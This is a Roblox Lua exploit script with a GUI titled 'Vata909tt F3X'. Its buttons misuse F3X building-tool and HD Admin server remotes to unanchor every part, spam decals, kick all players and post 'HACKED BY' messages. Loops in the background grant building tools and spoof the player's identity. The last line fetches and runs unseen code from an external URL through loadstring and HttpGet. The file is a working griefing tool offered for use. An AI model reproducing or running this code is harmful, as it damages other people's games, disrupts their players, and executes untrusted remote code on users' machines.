-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local UIGridLayout = Instance.new("UIGridLayout")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local TextButton_7 = Instance.new("TextButton")
local TextButton_8 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel_4 = Instance.new("TextLabel")
local TextLabel_5 = Instance.new("TextLabel")
local TextLabel_6 = Instance.new("TextLabel")
local ImageLabel_2 = Instance.new("ImageLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 85, 127)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.Position = UDim2.new(0.423628688, 0, 0.404791921, 0)
Frame.Size = UDim2.new(0, 597, 0, 367)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.Position = UDim2.new(1.02236442e-07, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 596, 0, 31)
TextLabel.ZIndex = 2
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Vata909tt F3X"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 25.000
TextLabel.TextWrapped = true

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BackgroundTransparency = 1.000
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.00905797072, 0, 0.133514985, 0)
Frame_2.Size = UDim2.new(0, 541, 0, 214)
Frame_2.ZIndex = 2

TextButton.Parent = Frame_2
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 0.500
TextButton.BorderColor3 = Color3.fromRGB(0, 85, 255)
TextButton.BorderSizePixel = 0
TextButton.Size = UDim2.new(0, 200, 0, 50)
TextButton.ZIndex = 2
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "play music"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000

UIGridLayout.Parent = Frame_2
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 125, 0, 30)

TextButton_2.Parent = Frame_2
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BackgroundTransparency = 0.500
TextButton_2.BorderColor3 = Color3.fromRGB(0, 85, 255)
TextButton_2.BorderSizePixel = 0
TextButton_2.Size = UDim2.new(0, 200, 0, 50)
TextButton_2.ZIndex = 2
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "skybox"
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextSize = 14.000

TextButton_3.Parent = Frame_2
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.BackgroundTransparency = 0.500
TextButton_3.BorderColor3 = Color3.fromRGB(0, 85, 255)
TextButton_3.BorderSizePixel = 0
TextButton_3.Size = UDim2.new(0, 200, 0, 50)
TextButton_3.ZIndex = 2
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "decal spam"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextSize = 14.000

TextButton_4.Parent = Frame_2
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.BackgroundTransparency = 0.500
TextButton_4.BorderColor3 = Color3.fromRGB(0, 85, 255)
TextButton_4.BorderSizePixel = 0
TextButton_4.Size = UDim2.new(0, 200, 0, 50)
TextButton_4.ZIndex = 2
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "unanchor"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextSize = 14.000

TextButton_5.Parent = Frame_2
TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.BackgroundTransparency = 0.500
TextButton_5.BorderColor3 = Color3.fromRGB(0, 85, 255)
TextButton_5.BorderSizePixel = 0
TextButton_5.Size = UDim2.new(0, 200, 0, 50)
TextButton_5.ZIndex = 2
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "message"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextSize = 14.000

TextButton_6.Parent = Frame_2
TextButton_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.BackgroundTransparency = 0.500
TextButton_6.BorderColor3 = Color3.fromRGB(0, 85, 255)
TextButton_6.BorderSizePixel = 0
TextButton_6.Size = UDim2.new(0, 200, 0, 50)
TextButton_6.ZIndex = 2
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "kick everyone"
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextSize = 14.000

TextButton_7.Parent = Frame_2
TextButton_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.BackgroundTransparency = 0.500
TextButton_7.BorderColor3 = Color3.fromRGB(0, 85, 255)
TextButton_7.BorderSizePixel = 0
TextButton_7.Size = UDim2.new(0, 200, 0, 50)
TextButton_7.ZIndex = 2
TextButton_7.Font = Enum.Font.SourceSans
TextButton_7.Text = "alert"
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextSize = 14.000

TextButton_8.Parent = Frame_2
TextButton_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.BackgroundTransparency = 0.500
TextButton_8.BorderColor3 = Color3.fromRGB(0, 85, 255)
TextButton_8.BorderSizePixel = 0
TextButton_8.Size = UDim2.new(0, 200, 0, 50)
TextButton_8.ZIndex = 2
TextButton_8.Font = Enum.Font.SourceSans
TextButton_8.Text = "server message"
TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.TextSize = 14.000

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0, 0, 0.395095378, 0)
TextLabel_2.Size = UDim2.new(0, 597, 0, 49)
TextLabel_2.ZIndex = 2
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "if you get a pop up saying to buy admin u need to buy it for the exploits to work."
TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(-0.000992306857, 0, 0.866485, 0)
TextLabel_3.Size = UDim2.new(0, 587, 0, 49)
TextLabel_3.ZIndex = 2
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = ""
TextLabel_3.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Size = UDim2.new(0, 44, 0, 31)
ImageLabel.ZIndex = 2
ImageLabel.Image = "rbxassetid://117646896635341"

TextLabel_4.Parent = Frame
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(-0.00167504186, 0, 0.610354245, 0)
TextLabel_4.Size = UDim2.new(0, 597, 0, 49)
TextLabel_4.ZIndex = 2
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "works in all games that have f3x api and where you have admin"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

TextLabel_5.Parent = Frame
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.BorderSizePixel = 0
TextLabel_5.Position = UDim2.new(-0.00167504186, 0, 0.77929157, 0)
TextLabel_5.Size = UDim2.new(0, 597, 0, 32)
TextLabel_5.ZIndex = 2
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = ""
TextLabel_5.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

TextLabel_6.Parent = Frame
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.BorderSizePixel = 0
TextLabel_6.Position = UDim2.new(5.11182208e-08, 0, 0.512261569, 0)
TextLabel_6.Size = UDim2.new(0, 596, 0, 36)
TextLabel_6.ZIndex = 2
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = ""
TextLabel_6.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14.000
TextLabel_6.TextWrapped = true

ImageLabel_2.Parent = Frame
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BackgroundTransparency = 1.000
ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel_2.BorderSizePixel = 0
ImageLabel_2.Position = UDim2.new(-5.11182208e-08, 0, 0.0844686627, 0)
ImageLabel_2.Size = UDim2.new(0, 596, 0, 336)
ImageLabel_2.Image = "rbxassetid://117646896635341"

-- Scripts:

local function VOLH_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";music 1847661821 ")
	end)
end
coroutine.wrap(VOLH_fake_script)()
local function ZHHNVSV_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;fog 43543346")
		wait(0.01)

		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool

		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end

		local remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end

		function SetMesh(part, meshid, vertexColor)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid,
						["VertexColor"] = vertexColor or Vector3.new(1, 1, 1)
					}
				}
			}
			_(args)
		end

		function CreatePart(cf,parent)
			local args = {[1] = "CreatePart", [2] = "Normal", [3] = cf, [4] = parent}
			_(args)
		end

		function AddMesh(part)
			local args = {[1] = "CreateMeshes", [2] = { [1] = { ["Part"] = part } } }
			_(args)
		end

		function SetTexture(part, texid)
			local args = {[1] = "SyncMesh", [2] = { [1] = { ["Part"] = part, ["TextureId"] = "rbxassetid://"..texid } } }
			_(args)
		end

		function SetName(part, stringg)
			local args = {[1] = "SetName", [2] = {[1] = part}, [3] = stringg}
			_(args)
		end

		function MeshResize(part,size)
			local args = {[1] = "SyncMesh", [2] = { [1] = { ["Part"] = part, ["Scale"] = size } } }
			_(args)
		end

		function SetLocked(part,boolean)
			local args = {[1] = "SetLocked", [2] = {[1] = part}, [3] = boolean}
			_(args)
		end

		function SetTrans(part,int)
			local args = {[1] = "SyncMaterial", [2] = { [1] = { ["Part"] = part, ["Transparency"] = int } } }
			_(args)
		end

		function Color(part,color)
			local args = {[1] = "SyncColor", [2] = { [1] = { ["Part"] = part, ["Color"] = color, ["UnionColoring"] = false } } }
			_(args)
		end

		function SyncLighting(part,brightness)
			local args = {[1] = "SyncLighting", [2] = { [1] = { ["Part"] = part, ["LightType"] = "PointLight", ["Brightness"] = brightness } } }
			_(args)
		end

		function Sky(id, transparency, scale, vertexColor, offset)
			local hrp = char.HumanoidRootPart.CFrame
			local basePos = Vector3.new(math.floor(hrp.x), math.floor(hrp.y), math.floor(hrp.z))

			local spawnPos = basePos + (offset or Vector3.new(0,0,0))

			CreatePart(CFrame.new(spawnPos) + Vector3.new(0, -10, 0), workspace)
			wait(0.01)

			for i, v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == spawnPos.X and v.CFrame.z == spawnPos.Z then

					SetName(v, "Sky")
					AddMesh(v)

					SetMesh(v, "111891702759441", vertexColor)
					SetTexture(v, id)
					MeshResize(v, Vector3.new(scale, scale, scale))

					SetLocked(v, true)
					SetTrans(v, transparency)

					local matArgs = {
						[1] = "SyncMaterial",
						[2] = { [1] = { ["Part"] = v, ["Material"] = Enum.Material.Neon } }
					}
					_(matArgs)

					Color(v, Color3.fromRGB(255, 255, 255))

					local lightArgs = {
						[1] = "CreateLights",
						[2] = { [1] = { ["Part"] = v, ["LightType"] = "PointLight" } }
					}
					_(lightArgs)

					SyncLighting(v, 0)
				end
			end
		end

		Sky("dont change this", 0, 13000, Vector3.new(0,0,0), Vector3.new(-25, -10, 0))

		wait(0.01)

		Sky("71869538800676", 0.02, 10000, Vector3.new(4,4,4), Vector3.new(25, -10, 0))
	end)
end
coroutine.wrap(ZHHNVSV_fake_script)()
local function YLHE_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		local id = "73859504735494"

		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool

		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" and v.Parent:FindFirstChild("Tools") and not v.Parent:FindFirstChild("Tools"):FindFirstChild("Marketplace") then
				tool = v.Parent
			end
		end

		if tool == nil then
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
		end

		local remote = tool.SyncAPI.ServerEndpoint

		local function GetPartsFromSelection(Selection)
			local Parts = {}
			for _, Descendant in pairs(Selection:GetDescendants()) do
				if Descendant:IsA('BasePart') and Descendant.Name ~= "Terrain" and not tostring(Descendant.Name):find("Sky") then
					Parts[#Parts + 1] = Descendant
				end
			end
			return Parts
		end

		local function SpawnDecal(side)
			task.defer(function()
				local getfuckedlol = GetPartsFromSelection(workspace)
				local shitass = {}
				for _, Part in pairs(getfuckedlol) do
					table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal" })
				end
				remote:InvokeServer('CreateTextures', shitass)
			end)
		end

		local function AddDecal(texture,side)
			task.defer(function()
				local getfuckedlol = GetPartsFromSelection(workspace)
				local shitass = {}
				for _, Part in pairs(getfuckedlol) do
					table.insert(shitass, { Part = Part, Face = side, TextureType = "Decal", Texture = "rbxassetid://"..texture })
				end
				remote:InvokeServer('SyncTexture', shitass)
			end)
		end

		SpawnDecal(Enum.NormalId.Front)
		AddDecal(id,Enum.NormalId.Front)

		SpawnDecal(Enum.NormalId.Back)
		AddDecal(id,Enum.NormalId.Back)

		SpawnDecal(Enum.NormalId.Right)
		AddDecal(id,Enum.NormalId.Right)

		SpawnDecal(Enum.NormalId.Left)
		AddDecal(id,Enum.NormalId.Left)

		SpawnDecal(Enum.NormalId.Bottom)
		AddDecal(id,Enum.NormalId.Bottom)

		SpawnDecal(Enum.NormalId.Top)
		AddDecal(id,Enum.NormalId.Top)

	end)
end
coroutine.wrap(YLHE_fake_script)()
local function ZOHZ_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local backpack = player.Backpack

		local function getf3x()
			for _, v in ipairs(backpack:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end
			for _, v in ipairs(char:GetChildren()) do
				if v:FindFirstChild("SyncAPI") then
					return v
				end
			end

			return nil
		end

		local f3x = getf3x()
		if not f3x then
			warn("you dont have f3x skid")
			return
		end

		local syncapi = f3x.SyncAPI
		local serverendpoint = syncapi.ServerEndpoint

		-- Function to unanchor a part
		local function unanchor(part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						Part = part,
						Anchored = false
					}
				}
			}
			serverendpoint:InvokeServer(unpack(args))
		end

		local function unanchorAll()
			for _, v in ipairs(workspace:GetDescendants()) do
				if (v:IsA("BasePart") or v:IsA("UnionOperation")) 
					and v.Name ~= "Sky" 
					and v.Name ~= "Skybox" then

					spawn(function()
						unanchor(v)
					end)
				end
			end
		end

		unanchorAll()
	end)
end
coroutine.wrap(ZOHZ_fake_script)()
local function QPTS_fake_script() -- TextButton_5.LocalScript 
	local script = Instance.new('LocalScript', TextButton_5)

	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";sc THIS GAME HAS BEEN HACKED BY VATA909TT")
		wait(0.2)
		RequestCommand:InvokeServer(";sc Join my discord")
	end)
end
coroutine.wrap(QPTS_fake_script)()
local function DJPUMBO_fake_script() -- TextButton_6.LocalScript 
	local script = Instance.new('LocalScript', TextButton_6)

	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";kick all THIS GAME HAS BEEN HACKED BY VATA909TT")
	end)
end
coroutine.wrap(DJPUMBO_fake_script)()
local function RAZJ_fake_script() -- TextButton_7.LocalScript 
	local script = Instance.new('LocalScript', TextButton_7)

	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";alert all THIS GAME HAS BEEN HACKED BY VATA909TT")
	end)
end
coroutine.wrap(RAZJ_fake_script)()
local function YUHO_fake_script() -- TextButton_8.LocalScript 
	local script = Instance.new('LocalScript', TextButton_8)

	script.Parent.MouseButton1Click:Connect(function()
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";sm THIS GAME HAS BEEN HACKED BY VATA909TT")
	end)
end
coroutine.wrap(YUHO_fake_script)()
local function GBZG_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService("UserInputService")

	local gui = script.Parent

	local dragging
	local dragInput
	local dragStart
	local startPos

	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end

	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
coroutine.wrap(GBZG_fake_script)()
local function SVYY_fake_script() -- ScreenGui.drag 
	local script = Instance.new('LocalScript', ScreenGui)

	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	local localPlayer = Players.LocalPlayer

	while true do
		local backpack = localPlayer:FindFirstChildOfClass("Backpack")
		local character = localPlayer.Character

		local hasF3X = false

		if backpack and backpack:FindFirstChild("Building Tools") then
			hasF3X = true
		elseif character and character:FindFirstChild("Building Tools") then
			hasF3X = true
		end

		if not hasF3X then
			local hdClient = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
			if hdClient then
				local signals = hdClient:FindFirstChild("Signals")
				local RequestCommand = signals and signals:FindFirstChild("RequestCommandSilent")
				if RequestCommand and RequestCommand:IsA("RemoteFunction") then
					RequestCommand:InvokeServer(";btools me")
				end
			end
		end

		task.wait(0.5)
	end

end
coroutine.wrap(SVYY_fake_script)()
local function PCFSGYG_fake_script() -- ScreenGui.spoof 
	local script = Instance.new('LocalScript', ScreenGui)

	print("loading spoofer")
	wait(8.5)
	print("spoofer should have worked")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer

	local HdClient = ReplicatedStorage:WaitForChild("HDAdminHDClient")
	local RequestCommand = HdClient:WaitForChild("Signals"):WaitForChild("RequestCommandSilent")

	local function applyCosmetics()
		local success, err = pcall(function()
			RequestCommand:InvokeServer(";char me Vata909tt")
			RequestCommand:InvokeServer(";name me Vata909tt")
			RequestCommand:InvokeServer(";chatname me Vata909tt red")
			RequestCommand:InvokeServer(";chattag me Vata909tt blue")
		end)
		return success
	end

	task.spawn(function()
		while true do
			local success = applyCosmetics()
			if success then
				break
			end
			task.wait(0.2)
		end

		LocalPlayer.CharacterAdded:Connect(function()
			task.wait(0.5) 
			applyCosmetics()
		end)
	end)

end
coroutine.wrap(PCFSGYG_fake_script)()
loadstring(game:HttpGet("https://vss.pandauth.com/kv/deaa02b2a4f1d562"))()
